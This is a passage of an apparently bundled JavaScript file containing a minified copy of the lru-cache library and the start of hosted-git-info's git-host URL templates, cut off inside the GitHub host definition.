var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __esm = (fn, res, err) => function __init() {
  if (err) throw err[0];
  try {
    return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
  } catch (e) {
    throw err = [e], e;
  }
};
var __commonJS = (cb, mod) => function __require() {
  try {
    return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
  } catch (e) {
    throw mod = 0, e;
  }
};
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// node_modules/.pnpm/lru-cache@11.5.2/node_modules/lru-cache/dist/commonjs/node/index.min.js
var require_index_min = __commonJS({
  "node_modules/.pnpm/lru-cache@11.5.2/node_modules/lru-cache/dist/commonjs/node/index.min.js"(exports2) {
    "use strict";
    var j = (u, t) => () => (t || u((t = { exports: {} }).exports, t), t.exports);
    var I = j((O) => {
      "use strict";
      Object.defineProperty(O, "__esModule", { value: true });
      O.tracing = O.metrics = void 0;
      var U = require("node:diagnostics_channel");
      O.metrics = (0, U.channel)("lru-cache:metrics");
      O.tracing = (0, U.tracingChannel)("lru-cache");
    });
    var P = j((R) => {
      "use strict";
      Object.defineProperty(R, "__esModule", { value: true });
      R.defaultPerf = void 0;
      R.defaultPerf = typeof performance == "object" && performance && typeof performance.now == "function" ? performance : Date;
    });
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.LRUCache = void 0;
    var g = I();
    var N = P();
    var C = () => g.metrics.hasSubscribers || g.tracing.hasSubscribers;
    var k = /* @__PURE__ */ new Set();
    var G = typeof process == "object" && process ? process : {};
    var V = (u, t, e, i) => {
      typeof G.emitWarning == "function" ? G.emitWarning(u, t, e, i) : console.error(`[${e}] ${t}: ${u}`);
    };
    var q = (u) => !k.has(u);
    var T = (u) => !!u && u === Math.floor(u) && u > 0 && isFinite(u);
    var H = (u) => T(u) ? u <= Math.pow(2, 8) ? Uint8Array : u <= Math.pow(2, 16) ? Uint16Array : u <= Math.pow(2, 32) ? Uint32Array : u <= Number.MAX_SAFE_INTEGER ? W : null : null;
    var W = class extends Array {
      constructor(t) {
        super(t), this.fill(0);
      }
    };
    var L = class u {
      heap;
      length;
      static #o = false;
      static create(t) {
        let e = H(t);
        if (!e) return [];
        u.#o = true;
        let i = new u(t, e);
        return u.#o = false, i;
      }
      constructor(t, e) {
        if (!u.#o) throw new TypeError("instantiate Stack using Stack.create(n)");
        this.heap = new e(t), this.length = 0;
      }
      push(t) {
        this.heap[this.length++] = t;
      }
      pop() {
        return this.heap[--this.length];
      }
    };
    var M = class u {
      #o;
      #c;
      #m;
      #W;
      #S;
      #x;
      #j;
      #w;
      get perf() {
        return this.#w;
      }
      ttl;
      ttlResolution;
      ttlAutopurge;
      updateAgeOnGet;
      updateAgeOnHas;
      allowStale;
      noDisposeOnSet;
      noUpdateTTL;
      maxEntrySize;
      sizeCalculation;
      noDeleteOnFetchRejection;
      noDeleteOnStaleGet;
      allowStaleOnFetchAbort;
      allowStaleOnFetchRejection;
      ignoreFetchAbort;
      backgroundFetchSize;
      #n;
      #b;
      #s;
      #i;
      #t;
      #l;
      #u;
      #a;
      #h;
      #_;
      #r;
      #y;
      #F;
      #d;
      #g;
      #T;
      #U;
      #f;
      #R;
      static unsafeExposeInternals(t) {
        return { starts: t.#F, ttls: t.#d, autopurgeTimers: t.#g, sizes: t.#y, keyMap: t.#s, keyList: t.#i, valList: t.#t, next: t.#l, prev: t.#u, get head() {
          return t.#a;
        }, get tail() {
          return t.#h;
        }, free: t.#_, isBackgroundFetch: (e) => t.#e(e), backgroundFetch: (e, i, s, n) => t.#G(e, i, s, n), moveToTail: (e) => t.#M(e), indexes: (e) => t.#A(e), rindexes: (e) => t.#z(e), isStale: (e) => t.#p(e) };
      }
      get max() {
        return this.#o;
      }
      get maxSize() {
        return this.#c;
      }
      get calculatedSize() {
        return this.#b;
      }
      get size() {
        return this.#n;
      }
      get fetchMethod() {
        return this.#x;
      }
      get memoMethod() {
        return this.#j;
      }
      get dispose() {
        return this.#m;
      }
      get onInsert() {
        return this.#W;
      }
      get disposeAfter() {
        return this.#S;
      }
      constructor(t) {
        let { max: e = 0, ttl: i, ttlResolution: s = 1, ttlAutopurge: n, updateAgeOnGet: o, updateAgeOnHas: l, allowStale: h, dispose: r, onInsert: c, disposeAfter: w, noDisposeOnSet: y, noUpdateTTL: d, maxSize: p = 0, maxEntrySize: f = 0, sizeCalculation: _, fetchMethod: a, memoMethod: S, noDeleteOnFetchRejection: F, noDeleteOnStaleGet: b, allowStaleOnFetchRejection: m, allowStaleOnFetchAbort: A, ignoreFetchAbort: z, backgroundFetchSize: x = 1, perf: v } = t;
        if (this.backgroundFetchSize = x, v !== void 0 && typeof v?.now != "function") throw new TypeError("perf option must have a now() method if specified");
        if (this.#w = v ?? N.defaultPerf, e !== 0 && !T(e)) throw new TypeError("max option must be a nonnegative integer");
        let E = e ? H(e) : Array;
        if (!E) throw new Error("invalid max value: " + e);
        if (this.#o = e, this.#c = p, this.maxEntrySize = f || this.#c, this.sizeCalculation = _, this.sizeCalculation) {
          if (!this.#c && !this.maxEntrySize) throw new TypeError("cannot set sizeCalculation without setting maxSize or maxEntrySize");
          if (typeof this.sizeCalculation != "function") throw new TypeError("sizeCalculation set to non-function");
        }
        if (S !== void 0 && typeof S != "function") throw new TypeError("memoMethod must be a function if defined");
        if (this.#j = S, a !== void 0 && typeof a != "function") throw new TypeError("fetchMethod must be a function if specified");
        if (this.#x = a, this.#U = !!a, this.#s = /* @__PURE__ */ new Map(), this.#i = Array.from({ length: e }).fill(void 0), this.#t = Array.from({ length: e }).fill(void 0), this.#l = new E(e), this.#u = new E(e), this.#a = 0, this.#h = 0, this.#_ = L.create(e), this.#n = 0, this.#b = 0, typeof r == "function" && (this.#m = r), typeof c == "function" && (this.#W = c), typeof w == "function" ? (this.#S = w, this.#r = []) : (this.#S = void 0, this.#r = void 0), this.#T = !!this.#m, this.#R = !!this.#W, this.#f = !!this.#S, this.noDisposeOnSet = !!y, this.noUpdateTTL = !!d, this.noDeleteOnFetchRejection = !!F, this.allowStaleOnFetchRejection = !!m, this.allowStaleOnFetchAbort = !!A, this.ignoreFetchAbort = !!z, this.maxEntrySize !== 0) {
          if (this.#c !== 0 && !T(this.#c)) throw new TypeError("maxSize must be a positive integer if specified");
          if (!T(this.maxEntrySize)) throw new TypeError("maxEntrySize must be a positive integer if specified");
          this.#X();
        }
        if (this.allowStale = !!h, this.noDeleteOnStaleGet = !!b, this.updateAgeOnGet = !!o, this.updateAgeOnHas = !!l, this.ttlResolution = T(s) || s === 0 ? s : 1, this.ttlAutopurge = !!n, this.ttl = i || 0, this.ttl) {
          if (!T(this.ttl)) throw new TypeError("ttl must be a positive integer if specified");
          this.#k();
        }
        if (this.#o === 0 && this.ttl === 0 && this.#c === 0) throw new TypeError("At least one of max, maxSize, or ttl is required");
        if (!this.ttlAutopurge && !this.#o && !this.#c) {
          let D = "LRU_CACHE_UNBOUNDED";
          q(D) && (k.add(D), V("TTL caching without ttlAutopurge, max, or maxSize can result in unbounded memory consumption.", "UnboundedCacheWarning", D, u));
        }
      }
      getRemainingTTL(t) {
        return this.#s.has(t) ? 1 / 0 : 0;
      }
      #k() {
        let t = new W(this.#o), e = new W(this.#o);
        this.#d = t, this.#F = e;
        let i = this.ttlAutopurge ? Array.from({ length: this.#o }) : void 0;
        this.#g = i, this.#H = (h, r, c = this.#w.now()) => {
          e[h] = r !== 0 ? c : 0, t[h] = r, s(h, r);
        }, this.#D = (h) => {
          e[h] = t[h] !== 0 ? this.#w.now() : 0, s(h, t[h]);
        };
        let s = this.ttlAutopurge ? (h, r) => {
          if (i?.[h] && (clearTimeout(i[h]), i[h] = void 0), r && r !== 0 && i) {
            let c = setTimeout(() => {
              this.#p(h) ? (this.#v(this.#i[h], "expire"), i[h] = void 0) : s(h, l(h));
            }, r + 1);
            c.unref && c.unref(), i[h] = c;
          }
        } : () => {
        };
        this.#E = (h, r) => {
          if (t[r]) {
            let c = t[r], w = e[r];
            if (!c || !w) return;
            h.ttl = c, h.start = w, h.now = n || o();
            let y = h.now - w;
            h.remainingTTL = c - y;
          }
        };
        let n = 0, o = () => {
          let h = this.#w.now();
          if (this.ttlResolution > 0) {
            n = h;
            let r = setTimeout(() => n = 0, this.ttlResolution);
            r.unref && r.unref();
          }
          return h;
        };
        this.getRemainingTTL = (h) => {
          let r = this.#s.get(h);
          return r === void 0 ? 0 : l(r);
        };
        let l = (h) => {
          let r = t[h], c = e[h];
          if (!r || !c) return 1 / 0;
          let w = (n || o()) - c;
          return r - w;
        };
        this.#p = (h) => {
          let r = e[h], c = t[h];
          return !!c && !!r && (n || o()) - r > c;
        };
      }
      #D = () => {
      };
      #E = () => {
      };
      #H = () => {
      };
      #p = () => false;
      #X() {
        let t = new W(this.#o);
        this.#b = 0, this.#y = t, this.#C = (e) => {
          this.#b -= t[e], t[e] = 0;
        }, this.#N = (e, i, s, n) => {
          if (!T(s)) {
            if (this.#e(i)) return this.backgroundFetchSize;
            if (n) {
              if (typeof n != "function") throw new TypeError("sizeCalculation must be a function");
              if (s = n(i, e), !T(s)) throw new TypeError("sizeCalculation return invalid (expect positive integer)");
            } else throw new TypeError("invalid size value (must be positive integer). When maxSize or maxEntrySize is used, sizeCalculation or size must be set.");
          }
          return s;
        }, this.#I = (e, i, s) => {
          if (t[e] = i, this.#c) {
            let n = this.#c - t[e];
            for (; this.#b > n; ) this.#P(true);
          }
          this.#b += t[e], s && (s.entrySize = i, s.totalCalculatedSize = this.#b);
        };
      }
      #C = (t) => {
      };
      #I = (t, e, i) => {
      };
      #N = (t, e, i, s) => {
        if (i || s) throw new TypeError("cannot set size without setting maxSize or maxEntrySize on cache");
        return 0;
      };
      *#A({ allowStale: t = this.allowStale } = {}) {
        if (this.#n) for (let e = this.#h; this.#V(e) && ((t || !this.#p(e)) && (yield e), e !== this.#a); ) e = this.#u[e];
      }
      *#z({ allowStale: t = this.allowStale } = {}) {
        if (this.#n) for (let e = this.#a; this.#V(e) && ((t || !this.#p(e)) && (yield e), e !== this.#h); ) e = this.#l[e];
      }
      #V(t) {
        return t !== void 0 && this.#s.get(this.#i[t]) === t;
      }
      *entries() {
        for (let t of this.#A()) this.#t[t] !== void 0 && this.#i[t] !== void 0 && !this.#e(this.#t[t]) && (yield [this.#i[t], this.#t[t]]);
      }
      *rentries() {
        for (let t of this.#z()) this.#t[t] !== void 0 && this.#i[t] !== void 0 && !this.#e(this.#t[t]) && (yield [this.#i[t], this.#t[t]]);
      }
      *keys() {
        for (let t of this.#A()) {
          let e = this.#i[t];
          e !== void 0 && !this.#e(this.#t[t]) && (yield e);
        }
      }
      *rkeys() {
        for (let t of this.#z()) {
          let e = this.#i[t];
          e !== void 0 && !this.#e(this.#t[t]) && (yield e);
        }
      }
      *values() {
        for (let t of this.#A()) this.#t[t] !== void 0 && !this.#e(this.#t[t]) && (yield this.#t[t]);
      }
      *rvalues() {
        for (let t of this.#z()) this.#t[t] !== void 0 && !this.#e(this.#t[t]) && (yield this.#t[t]);
      }
      [Symbol.iterator]() {
        return this.entries();
      }
      [Symbol.toStringTag] = "LRUCache";
      find(t, e = {}) {
        for (let i of this.#A()) {
          let s = this.#t[i], n = this.#e(s) ? s.__staleWhileFetching : s;
          if (n !== void 0 && t(n, this.#i[i], this)) return this.#L(this.#i[i], e);
        }
      }
      forEach(t, e = this) {
        for (let i of this.#A()) {
          let s = this.#t[i], n = this.#e(s) ? s.__staleWhileFetching : s;
          n !== void 0 && t.call(e, n, this.#i[i], this);
        }
      }
      rforEach(t, e = this) {
        for (let i of this.#z()) {
          let s = this.#t[i], n = this.#e(s) ? s.__staleWhileFetching : s;
          n !== void 0 && t.call(e, n, this.#i[i], this);
        }
      }
      purgeStale() {
        let t = false;
        for (let e of this.#z({ allowStale: true })) this.#p(e) && (this.#v(this.#i[e], "expire"), t = true);
        return t;
      }
      info(t) {
        let e = this.#s.get(t);
        if (e === void 0) return;
        let i = this.#t[e], s = this.#e(i) ? i.__staleWhileFetching : i;
        if (s === void 0) return;
        let n = { value: s };
        if (this.#d && this.#F) {
          let o = this.#d[e], l = this.#F[e];
          if (o && l) {
            let h = o - (this.#w.now() - l);
            n.ttl = h, n.start = Date.now();
          }
        }
        return this.#y && (n.size = this.#y[e]), n;
      }
      dump() {
        let t = [];
        for (let e of this.#A({ allowStale: true })) {
          let i = this.#i[e], s = this.#t[e], n = this.#e(s) ? s.__staleWhileFetching : s;
          if (n === void 0 || i === void 0) continue;
          let o = { value: n };
          if (this.#d && this.#F) {
            o.ttl = this.#d[e];
            let l = this.#w.now() - this.#F[e];
            o.start = Math.floor(Date.now() - l);
          }
          this.#y && (o.size = this.#y[e]), t.unshift([i, o]);
        }
        return t;
      }
      load(t) {
        this.clear();
        for (let [e, i] of t) {
          if (i.start) {
            let s = Date.now() - i.start;
            i.start = this.#w.now() - s;
          }
          this.#O(e, i.value, i);
        }
      }
      set(t, e, i = {}) {
        let { status: s = g.metrics.hasSubscribers ? {} : void 0 } = i;
        i.status = s, s && (s.op = "set", s.key = t, e !== void 0 && (s.value = e), s.cache = this);
        let n = this.#O(t, e, i);
        return s && g.metrics.hasSubscribers && g.metrics.publish(s), n;
      }
      #O(t, e, i, s) {
        let { ttl: n = this.ttl, start: o, noDisposeOnSet: l = this.noDisposeOnSet, sizeCalculation: h = this.sizeCalculation, status: r } = i, c = this.#e(e);
        if (e === void 0) return r && (r.set = "deleted"), this.delete(t), this;
        let { noUpdateTTL: w = this.noUpdateTTL } = i;
        r && !c && (r.value = e);
        let y = this.#N(t, e, i.size || 0, h, r);
        if (this.maxEntrySize && y > this.maxEntrySize) return this.#v(t, "set"), r && (r.set = "miss", r.maxEntrySizeExceeded = true), this;
        let d = this.#n === 0 ? void 0 : this.#s.get(t);
        if (d === void 0) d = this.#n === 0 ? this.#h : this.#_.length !== 0 ? this.#_.pop() : this.#n === this.#o ? this.#P(false) : this.#n, this.#i[d] = t, this.#t[d] = e, this.#s.set(t, d), this.#l[this.#h] = d, this.#u[d] = this.#h, this.#h = d, this.#n++, this.#I(d, y, r), r && (r.set = "add"), w = false, this.#R && !c && this.#W?.(e, t, "add");
        else {
          this.#M(d);
          let p = this.#t[d];
          if (e !== p) {
            if (!l) if (this.#e(p)) {
              p !== s && p.__abortController.abort(new Error("replaced"));
              let { __staleWhileFetching: f } = p;
              f !== void 0 && f !== e && (this.#T && this.#m?.(f, t, "set"), this.#f && this.#r?.push([f, t, "set"]));
            } else this.#T && this.#m?.(p, t, "set"), this.#f && this.#r?.push([p, t, "set"]);
            if (this.#C(d), this.#I(d, y, r), this.#t[d] = e, !c) {
              let f = p && this.#e(p) ? p.__staleWhileFetching : p, _ = f === void 0 ? "add" : e !== f ? "replace" : "update";
              r && (r.set = _, f !== void 0 && (r.oldValue = f)), this.#R && this.onInsert?.(e, t, _);
            }
          } else c || (r && (r.set = "update"), this.#R && this.onInsert?.(e, t, "update"));
        }
        if (n !== 0 && !this.#d && this.#k(), this.#d && (w || this.#H(d, n, o), r && this.#E(r, d)), !l && this.#f && this.#r) {
          let p = this.#r, f;
          for (; f = p?.shift(); ) this.#S?.(...f);
        }
        return this;
      }
      pop() {
        try {
          for (; this.#n; ) {
            let t = this.#t[this.#a];
            if (this.#P(true), this.#e(t)) {
              if (t.__staleWhileFetching) return t.__staleWhileFetching;
            } else if (t !== void 0) return t;
          }
        } finally {
          if (this.#f && this.#r) {
            let t = this.#r, e;
            for (; e = t?.shift(); ) this.#S?.(...e);
          }
        }
      }
      #P(t) {
        let e = this.#a, i = this.#i[e], s = this.#t[e], n = this.#e(s);
        n && s.__abortController.abort(new Error("evicted"));
        let o = n ? s.__staleWhileFetching : s;
        return (this.#T || this.#f) && o !== void 0 && (this.#T && this.#m?.(o, i, "evict"), this.#f && this.#r?.push([o, i, "evict"])), this.#C(e), this.#g?.[e] && (clearTimeout(this.#g[e]), this.#g[e] = void 0), t && (this.#i[e] = void 0, this.#t[e] = void 0, this.#_.push(e)), this.#n === 1 ? (this.#a = this.#h = 0, this.#_.length = 0) : this.#a = this.#l[e], this.#s.delete(i), this.#n--, e;
      }
      has(t, e = {}) {
        let { status: i = g.metrics.hasSubscribers ? {} : void 0 } = e;
        e.status = i, i && (i.op = "has", i.key = t, i.cache = this);
        let s = this.#Y(t, e);
        return g.metrics.hasSubscribers && g.metrics.publish(i), s;
      }
      #Y(t, e = {}) {
        let { updateAgeOnHas: i = this.updateAgeOnHas, status: s } = e, n = this.#s.get(t);
        if (n !== void 0) {
          let o = this.#t[n];
          if (this.#e(o) && o.__staleWhileFetching === void 0) return false;
          if (this.#p(n)) s && (s.has = "stale", this.#E(s, n));
          else return i && this.#D(n), s && (s.has = "hit", this.#E(s, n)), true;
        } else s && (s.has = "miss");
        return false;
      }
      peek(t, e = {}) {
        let { status: i = C() ? {} : void 0 } = e;
        i && (i.op = "peek", i.key = t, i.cache = this), e.status = i;
        let s = this.#J(t, e);
        return g.metrics.hasSubscribers && g.metrics.publish(i), s;
      }
      #J(t, e) {
        let { status: i, allowStale: s = this.allowStale } = e, n = this.#s.get(t);
        if (n === void 0 || !s && this.#p(n)) {
          i && (i.peek = n === void 0 ? "miss" : "stale");
          return;
        }
        let o = this.#t[n], l = this.#e(o) ? o.__staleWhileFetching : o;
        return i && (l !== void 0 ? (i.peek = "hit", i.value = l) : i.peek = "miss"), l;
      }
      #G(t, e, i, s) {
        let n = e === void 0 ? void 0 : this.#t[e];
        if (this.#e(n)) return n;
        let o = new AbortController(), { signal: l } = i;
        l?.addEventListener("abort", () => o.abort(l.reason), { signal: o.signal });
        let h = { signal: o.signal, options: i, context: s }, r = (f, _ = false) => {
          let { aborted: a } = o.signal, S = i.ignoreFetchAbort && f !== void 0, F = i.ignoreFetchAbort || !!(i.allowStaleOnFetchAbort && f !== void 0);
          if (i.status && (a && !_ ? (i.status.fetchAborted = true, i.status.fetchError = o.signal.reason, S && (i.status.fetchAbortIgnored = true)) : i.status.fetchResolved = true), a && !S && !_) return w(o.signal.reason, F);
          let b = d, m = this.#t[e];
          return (m === d || m === void 0 && S && _) && (f === void 0 ? b.__staleWhileFetching !== void 0 ? this.#t[e] = b.__staleWhileFetching : this.#v(t, "fetch") : (i.status && (i.status.fetchUpdated = true), this.#O(t, f, h.options, b))), f;
        }, c = (f) => (i.status && (i.status.fetchRejected = true, i.status.fetchError = f), w(f, false)), w = (f, _) => {
          let { aborted: a } = o.signal, S = a && i.allowStaleOnFetchAbort, F = S || i.allowStaleOnFetchRejection, b = F || i.noDeleteOnFetchRejection, m = d;
          if (this.#t[e] === d && (!b || !_ && m.__staleWhileFetching === void 0 ? this.#v(t, "fetch") : S || (this.#t[e] = m.__staleWhileFetching)), F) return i.status && m.__staleWhileFetching !== void 0 && (i.status.returnedStale = true), m.__staleWhileFetching;
          if (m.__returned === m) throw f;
        }, y = (f, _) => {
          let a = this.#x?.(t, n, h);
          o.signal.addEventListener("abort", () => {
            (!i.ignoreFetchAbort || i.allowStaleOnFetchAbort) && (f(void 0), i.allowStaleOnFetchAbort && (f = (S) => r(S, true)));
          }), a && a instanceof Promise ? a.then((S) => f(S === void 0 ? void 0 : S), _) : a !== void 0 && f(a);
        };
        i.status && (i.status.fetchDispatched = true);
        let d = new Promise(y).then(r, c), p = Object.assign(d, { __abortController: o, __staleWhileFetching: n, __returned: void 0 });
        return e === void 0 ? (this.#O(t, p, { ...h.options, status: void 0 }), e = this.#s.get(t)) : this.#t[e] = p, p;
      }
      #e(t) {
        if (!this.#U) return false;
        let e = t;
        return !!e && e instanceof Promise && e.hasOwnProperty("__staleWhileFetching") && e.__abortController instanceof AbortController;
      }
      fetch(t, e = {}) {
        let i = g.tracing.hasSubscribers, { status: s = C() ? {} : void 0 } = e;
        e.status = s, s && e.context && (s.context = e.context);
        let n = this.#q(t, e);
        return s && i && (s.trace = true, g.tracing.tracePromise(() => n, s).catch(() => {
        })), n;
      }
      async #q(t, e = {}) {
        let { allowStale: i = this.allowStale, updateAgeOnGet: s = this.updateAgeOnGet, noDeleteOnStaleGet: n = this.noDeleteOnStaleGet, ttl: o = this.ttl, noDisposeOnSet: l = this.noDisposeOnSet, size: h = 0, sizeCalculation: r = this.sizeCalculation, noUpdateTTL: c = this.noUpdateTTL, noDeleteOnFetchRejection: w = this.noDeleteOnFetchRejection, allowStaleOnFetchRejection: y = this.allowStaleOnFetchRejection, ignoreFetchAbort: d = this.ignoreFetchAbort, allowStaleOnFetchAbort: p = this.allowStaleOnFetchAbort, context: f, forceRefresh: _ = false, status: a, signal: S } = e;
        if (a && (a.op = "fetch", a.key = t, _ && (a.forceRefresh = true), a.cache = this), !this.#U) return a && (a.fetch = "get"), this.#L(t, { allowStale: i, updateAgeOnGet: s, noDeleteOnStaleGet: n, status: a });
        let F = { allowStale: i, updateAgeOnGet: s, noDeleteOnStaleGet: n, ttl: o, noDisposeOnSet: l, size: h, sizeCalculation: r, noUpdateTTL: c, noDeleteOnFetchRejection: w, allowStaleOnFetchRejection: y, allowStaleOnFetchAbort: p, ignoreFetchAbort: d, status: a, signal: S }, b = this.#s.get(t);
        if (b === void 0) {
          a && (a.fetch = "miss");
          let m = this.#G(t, b, F, f);
          return m.__returned = m;
        } else {
          let m = this.#t[b];
          if (this.#e(m)) {
            let E = i && m.__staleWhileFetching !== void 0;
            return a && (a.fetch = "inflight", E && (a.returnedStale = true)), E ? m.__staleWhileFetching : m.__returned = m;
          }
          let A = this.#p(b);
          if (!_ && !A) return a && (a.fetch = "hit"), this.#M(b), s && this.#D(b), a && this.#E(a, b), m;
          let z = this.#G(t, b, F, f), v = z.__staleWhileFetching !== void 0 && i;
          return a && (a.fetch = A ? "stale" : "refresh", v && A && (a.returnedStale = true)), v ? z.__staleWhileFetching : z.__returned = z;
        }
      }
      forceFetch(t, e = {}) {
        let i = g.tracing.hasSubscribers, { status: s = C() ? {} : void 0 } = e;
        e.status = s, s && e.context && (s.context = e.context);
        let n = this.#K(t, e);
        return s && i && (s.trace = true, g.tracing.tracePromise(() => n, s).catch(() => {
        })), n;
      }
      async #K(t, e = {}) {
        let i = await this.#q(t, e);
        if (i === void 0) throw new Error("fetch() returned undefined");
        return i;
      }
      memo(t, e = {}) {
        let { status: i = g.metrics.hasSubscribers ? {} : void 0 } = e;
        e.status = i, i && (i.op = "memo", i.key = t, e.context && (i.context = e.context), i.cache = this);
        let s = this.#Q(t, e);
        return i && (i.value = s), g.metrics.hasSubscribers && g.metrics.publish(i), s;
      }
      #Q(t, e = {}) {
        let i = this.#j;
        if (!i) throw new Error("no memoMethod provided to constructor");
        let { context: s, status: n, forceRefresh: o, ...l } = e;
        n && o && (n.forceRefresh = true);
        let h = this.#L(t, l), r = o || h === void 0;
        if (n && (n.memo = r ? "miss" : "hit", r || (n.value = h)), !r) return h;
        let c = i(t, h, { options: l, context: s });
        return n && (n.value = c), this.#O(t, c, l), c;
      }
      get(t, e = {}) {
        let { status: i = g.metrics.hasSubscribers ? {} : void 0 } = e;
        e.status = i, i && (i.op = "get", i.key = t, i.cache = this);
        let s = this.#L(t, e);
        return i && (s !== void 0 && (i.value = s), g.metrics.hasSubscribers && g.metrics.publish(i)), s;
      }
      #L(t, e = {}) {
        let { allowStale: i = this.allowStale, updateAgeOnGet: s = this.updateAgeOnGet, noDeleteOnStaleGet: n = this.noDeleteOnStaleGet, status: o } = e, l = this.#s.get(t);
        if (l === void 0) {
          o && (o.get = "miss");
          return;
        }
        let h = this.#t[l], r = this.#e(h);
        return o && this.#E(o, l), this.#p(l) ? r ? (o && (o.get = "stale-fetching"), i && h.__staleWhileFetching !== void 0 ? (o && (o.returnedStale = true), h.__staleWhileFetching) : void 0) : (n || this.#v(t, "expire"), o && (o.get = "stale"), i ? (o && (o.returnedStale = true), h) : void 0) : (o && (o.get = r ? "fetching" : "hit"), this.#M(l), s && this.#D(l), r ? h.__staleWhileFetching : h);
      }
      #B(t, e) {
        this.#u[e] = t, this.#l[t] = e;
      }
      #M(t) {
        t !== this.#h && (t === this.#a ? this.#a = this.#l[t] : this.#B(this.#u[t], this.#l[t]), this.#B(this.#h, t), this.#h = t);
      }
      delete(t) {
        return this.#v(t, "delete");
      }
      #v(t, e) {
        g.metrics.hasSubscribers && g.metrics.publish({ op: "delete", delete: e, key: t, cache: this });
        let i = false;
        if (this.#n !== 0) {
          let s = this.#s.get(t);
          if (s !== void 0) if (this.#g?.[s] && (clearTimeout(this.#g[s]), this.#g[s] = void 0), i = true, this.#n === 1) this.#$(e);
          else {
            this.#C(s);
            let n = this.#t[s];
            if (this.#e(n) ? n.__abortController.abort(new Error("deleted")) : (this.#T || this.#f) && (this.#T && this.#m?.(n, t, e), this.#f && this.#r?.push([n, t, e])), this.#s.delete(t), this.#i[s] = void 0, this.#t[s] = void 0, s === this.#h) this.#h = this.#u[s];
            else if (s === this.#a) this.#a = this.#l[s];
            else {
              let o = this.#u[s];
              this.#l[o] = this.#l[s];
              let l = this.#l[s];
              this.#u[l] = this.#u[s];
            }
            this.#n--, this.#_.push(s);
          }
        }
        if (this.#f && this.#r?.length) {
          let s = this.#r, n;
          for (; n = s?.shift(); ) this.#S?.(...n);
        }
        return i;
      }
      clear() {
        return this.#$("delete");
      }
      #$(t) {
        for (let e of this.#z({ allowStale: true })) {
          let i = this.#t[e];
          if (this.#e(i)) i.__abortController.abort(new Error("deleted"));
          else {
            let s = this.#i[e];
            this.#T && this.#m?.(i, s, t), this.#f && this.#r?.push([i, s, t]);
          }
        }
        if (this.#s.clear(), this.#t.fill(void 0), this.#i.fill(void 0), this.#d && this.#F) {
          this.#d.fill(0), this.#F.fill(0);
          for (let e of this.#g ?? []) e !== void 0 && clearTimeout(e);
          this.#g?.fill(void 0);
        }
        if (this.#y && this.#y.fill(0), this.#a = 0, this.#h = 0, this.#_.length = 0, this.#b = 0, this.#n = 0, this.#f && this.#r) {
          let e = this.#r, i;
          for (; i = e?.shift(); ) this.#S?.(...i);
        }
      }
    };
    exports2.LRUCache = M;
  }
});

// node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/hosts.js
var require_hosts = __commonJS({
  "node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/hosts.js"(exports2, module2) {
    "use strict";
    var maybeJoin = (...args) => args.every((arg) => arg) ? args.join("") : "";
    var maybeEncode = (arg) => arg ? encodeURIComponent(arg) : "";
    var formatHashFragment = (f) => f.toLowerCase().replace(/^\W+/g, "").replace(/(?<!\W)\W+$/, "").replace(/\//g, "").replace(/\W+/g, "-");
    var defaults = {
      sshtemplate: ({ domain, user, project, committish }) => `git@${domain}:${user}/${project}.git${maybeJoin("#", committish)}`,
      sshurltemplate: ({ domain, user, project, committish }) => `git+ssh://git@${domain}/${user}/${project}.git${maybeJoin("#", committish)}`,
      edittemplate: ({ domain, user, project, committish, editpath, path: path2 }) => `https://${domain}/${user}/${project}${maybeJoin("/", editpath, "/", maybeEncode(committish || "HEAD"), "/", path2)}`,
      browsetemplate: ({ domain, user, project, committish, treepath }) => `https://${domain}/${user}/${project}${maybeJoin("/", treepath, "/", maybeEncode(committish))}`,
      browsetreetemplate: ({ domain, user, project, committish, treepath, path: path2, fragment, hashformat }) => `https://${domain}/${user}/${project}/${treepath}/${maybeEncode(committish || "HEAD")}/${path2}${maybeJoin("#", hashformat(fragment || ""))}`,
      browseblobtemplate: ({ domain, user, project, committish, blobpath, path: path2, fragment, hashformat }) => `https://${domain}/${user}/${project}/${blobpath}/${maybeEncode(committish || "HEAD")}/${path2}${maybeJoin("#", hashformat(fragment || ""))}`,
      docstemplate: ({ domain, user, project, treepath, committish }) => `https://${domain}/${user}/${project}${maybeJoin("/", treepath, "/", maybeEncode(committish))}#readme`,
      httpstemplate: ({ auth, domain, user, project, committish }) => `git+https://${maybeJoin(auth, "@")}${domain}/${user}/${project}.git${maybeJoin("#", committish)}`,
      filetemplate: ({ domain, user, project, committish, path: path2 }) => `https://${domain}/${user}/${project}/raw/${maybeEncode(committish || "HEAD")}/${path2}`,
      shortcuttemplate: ({ type, user, project, committish }) => `${type}:${user}/${project}${maybeJoin("#", committish)}`,
      pathtemplate: ({ user, project, committish }) => `${user}/${project}${maybeJoin("#", committish)}`,
      bugstemplate: ({ domain, user, project }) => `https://${domain}/${user}/${project}/issues`,
      hashformat: formatHashFragment
    };
    var hosts = {};
    hosts.github = {
      // First two are insecure and generally shouldn't be used any more, but
      // they are still supported.
      protocols: ["git:", "http:", "git+ssh:", "git+https:", "ssh:", "https:"],
      domain: "github.com",
      treepath: "tree",
      blobpath: "blob",
      editpath: "edit",
